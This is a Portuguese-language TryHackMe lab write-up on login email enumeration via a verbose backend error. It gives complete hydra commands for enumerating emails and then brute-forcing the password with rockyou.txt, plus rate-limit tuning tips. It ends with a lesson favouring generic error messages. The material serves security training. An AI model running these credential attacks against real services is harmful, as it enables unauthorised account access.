## Objetivo
usar enumeração com hydra para achar o email a partir de um erro verbose de backend


## Vulnerabilidade Identificada

quando no campo login coloca um email q n existe no banco de dados retorna json {"status":"error","message":"Email does not exist"}
assim usando a substring "Email does not exist" é possivel usar tools para fuzz e descobrir quando retornar um json diferente


## Metodologia
apos usar burp para achar o caminho do backend do alvo identificado como: POST /labs/verbose_login/functions.php HTTP/1.1
e a estrutura de login identificado como: username=admin%40gmail.com&password=abc123&function=login  ``(dados teste, foco apenas na estrutura)``
e apos identificar o retorno json com erro verbose {"status":"error","message":"Email does not exist"}. usamos a substring "Email does not exist" para a enumeração inicial

o exercicio dava o caminho da lista de emails para usar no github https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt 
numa situação real daria wget no link raw ficaria wget https://raw.githubusercontent.com/nyxgeek/username-lists/refs/heads/master/usernames-top100/usernames_gmail.com.txt   
como a attackbox da tryhackme n tem acesso a internet eu copiei o conteudo e colei dentro de uma wordlist da attackbox ficou assim minha linha de ataque 

## Comandos Utilizados

```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
-p teste \
enum.thm \
http-post-form \
"/labs/verbose_login/functions.php:username=^USER^&password=^PASS^&function=login:Email does not exist"
```


o exercicio n pediu, mas eu montei a linha de ataque para a senha 


```bash
hydra -l canderson@gmail.com \
-P /usr/share/wordlists/rockyou.txt \
enum.thm \
http-post-form \
"/labs/verbose_login/functions.php:username=^USER^&password=^PASS^&function=login:Invalid password"
```

OBS: em servidores fracos é bom usar -t 1 \ ou -t 4 \ para evitar o rating limite e não acabar derrubando o servidor.


## Resultado

como resultado da enumeração consegui o email canderson@gmail.com


## Lições Aprendidas

Se um backend faz um early return com mensagens de erro diferenciadas em vez de sempre executar as duas checagens e retornar uma mensagem generica identica como credenciais incorretas ou email ou senha incorreto. ele abre uma brecha para enumeração & Brute force.








